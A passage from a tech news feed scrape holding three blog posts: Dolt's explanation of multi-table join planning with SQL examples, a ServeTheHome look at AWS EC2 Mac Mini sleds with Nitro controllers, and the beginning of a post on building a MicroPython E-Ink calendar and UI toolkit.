<div data-language="sql"><pre><code><span>%</span> mkdir <span>join</span><span>-</span>planning <span>&amp;&amp;</span> cd <span>join</span><span>-</span>planning
<span>%</span> dolt init
Successfully initialized dolt <span>data</span> repository<span>.</span>
<span>%</span> dolt <span>sql</span>



join_planning<span>&gt;</span> <span>create</span> <span>table</span> states <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> cities <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> state <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>,</span> population <span>int</span> <span>unsigned</span><span>)</span><span>;</span>
join_planning<span>&gt;</span> <span>create</span> <span>table</span> people <span>(</span>name <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>primary</span> <span>key</span> <span>not</span> <span>null</span><span>,</span> city <span>varchar</span><span>(</span><span>100</span><span>)</span> <span>not</span> <span>null</span><span>)</span><span>;</span></code></pre></div>
<p>Let's say that we want a list of people named "John Smith" along with
names and populations of the cities and states they live in. We would
write a query like this:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span>
<span>+</span>
<span>|</span> <span>plan</span>                                                        <span>|</span>
<span>+</span>
<span>|</span> IndexedJoin<span>(</span>p<span>.</span>city <span>=</span> c<span>.</span>name<span>)</span>                                <span>|</span>
<span>|</span>  ‚îú‚îÄ Filter<span>(</span>p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>)</span>                           <span>|</span>
<span>|</span>  ‚îÇ   ‚îî‚îÄ Projected <span>table</span> access <span>on</span> <span>[</span>name city<span>]</span>               <span>|</span>
<span>|</span>  ‚îÇ       ‚îî‚îÄ TableAlias<span>(</span>p<span>)</span>                                   <span>|</span>
<span>|</span>  ‚îÇ           ‚îî‚îÄ Indexed <span>table</span> access <span>on</span> <span>index</span> <span>[</span>people<span>.</span>name<span>]</span> <span>|</span>
<span>|</span>  ‚îÇ               ‚îî‚îÄ Exchange<span>(</span>parallelism<span>=</span><span>16</span><span>)</span>                <span>|</span>
<span>|</span>  ‚îÇ                   ‚îî‚îÄ <span>Table</span><span>(</span>people<span>)</span>                       <span>|</span>
<span>|</span>  ‚îî‚îÄ IndexedJoin<span>(</span>s<span>.</span>name <span>=</span> c<span>.</span>state<span>)</span>                           <span>|</span>
<span>|</span>      ‚îú‚îÄ TableAlias<span>(</span>c<span>)</span>                                       <span>|</span>
<span>|</span>      ‚îÇ   ‚îî‚îÄ IndexedTableAccess<span>(</span>cities <span>on</span> <span>[</span>cities<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>|</span>      ‚îî‚îÄ TableAlias<span>(</span>s<span>)</span>                                       <span>|</span>
<span>|</span>          ‚îî‚îÄ IndexedTableAccess<span>(</span>states <span>on</span> <span>[</span>states<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>
<table>
<thead>
<tr>
<th>Join plan</th>
<th>Number of rows accessed</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cross join</td>
<td>343 * 10^12</td>
</tr>
<tr>
<td>Cross join with pushdown</td>
<td>50 * 10^9</td>
</tr>
<tr>
<td>Pushdown and indexed access</td>
<td>144 * 10^3</td>
</tr>
</tbody>
</table>
<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="two table join" title="two table join" src="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" srcset="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/a48b3/simple-join.png 214w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/47730/simple-join.png 428w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png 441w" sizes="(max-width: 441px) 100vw, 441px" loading="lazy">
  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="three table join" title="three table join" src="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" srcset="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/a48b3/three-table-join.png 214w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/47730/three-table-join.png 428w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png 578w" sizes="(max-width: 578px) 100vw, 578px" loading="lazy">
  </a>
    </span></p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c <span>join</span> D <span>on</span> c <span>=</span> d<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="four table join" title="four table join" src="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" srcset="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/a48b3/four-table-join.png 214w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/47730/four-table-join.png 428w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png 721w" sizes="(max-width: 721px) 100vw, 721px" loading="lazy">
  </a>
    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png 856w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png 904w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png 717w" sizes="(max-width: 717px) 100vw, 717px" loading="lazy">
  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="invalid three table join" title="invalid three table join" src="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" srcset="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/a48b3/three-table-invalid.png 214w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/47730/three-table-invalid.png 428w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png 577w" sizes="(max-width: 577px) 100vw, 577px" loading="lazy">
  </a></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dolthub.com/blog/2020-12-28-join-planning/">https://www.dolthub.com/blog/2020-12-28-join-planning/</a></em></p>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-12-28-join-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561173</guid>
            <pubDate>Mon, 28 Dec 2020 17:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How AWS Added Apple Mac Mini Nodes to EC2]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 206 (<a href="https://news.ycombinator.com/item?id=25561127">thread link</a>) | @tambourine_man
<br/>
December 28, 2020 | https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg" data-caption="AWS EC2 Apple Mac Mini Node In Rack Cover"><img width="696" height="449" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-400x258.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-651x420.jpg 651w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="AWS EC2 Apple Mac Mini Node In Rack Cover" title="AWS EC2 Apple Mac Mini Node In Rack Cover"></a><figcaption>AWS EC2 Apple Mac Mini Node In Rack Cover</figcaption></figure></div>
            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>
<figure id="attachment_49659" aria-describedby="caption-attachment-49659"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-nitro-to-nitro4/" rel="attachment wp-att-49659"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg" alt="AWS Nitro To Nitro4" width="2560" height="688" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg 2560w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-400x107.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-800x215.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1536x413.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-2048x550.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-696x187.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1068x287.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1564x420.jpg 1564w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-49659">AWS Nitro To Nitro4</figcaption></figure>
<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>
<p><iframe title="What is a DPU - A Quick STH Primer to the New Processor" width="696" height="392" src="https://www.youtube.com/embed/S92rdAwIuNk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>
<figure id="attachment_49660" aria-describedby="caption-attachment-49660"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack-nitro-controller-highlighted/" rel="attachment wp-att-49660"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted" width="1355" height="609" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg 1355w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-400x180.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-800x360.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-696x313.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-1068x480.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-934x420.jpg 934w" sizes="(max-width: 1355px) 100vw, 1355px"></a><figcaption id="caption-attachment-49660">AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted</figcaption></figure>
<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS‚Äôs screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS‚Äôs infrastructure to host the node versus many of AWS‚Äôs other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561127</guid>
            <pubDate>Mon, 28 Dec 2020 17:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Building an E-Ink Calendar and a UI Toolkit along the way]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25560570">thread link</a>) | @rahulrav
<br/>
December 28, 2020 | https://rahulrav.com/blog/e_ink_dashboard.html | <a href="https://web.archive.org/web/*/https://rahulrav.com/blog/e_ink_dashboard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <main>
            <div>
              <div>
                <p>December 27 2020, Monday</p>
<h3 id="building-an-e-ink-calendar-and-a-ui-toolkit-along-the-way">Building an E-Ink Calendar, and a UI Toolkit along the way</h3>
<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
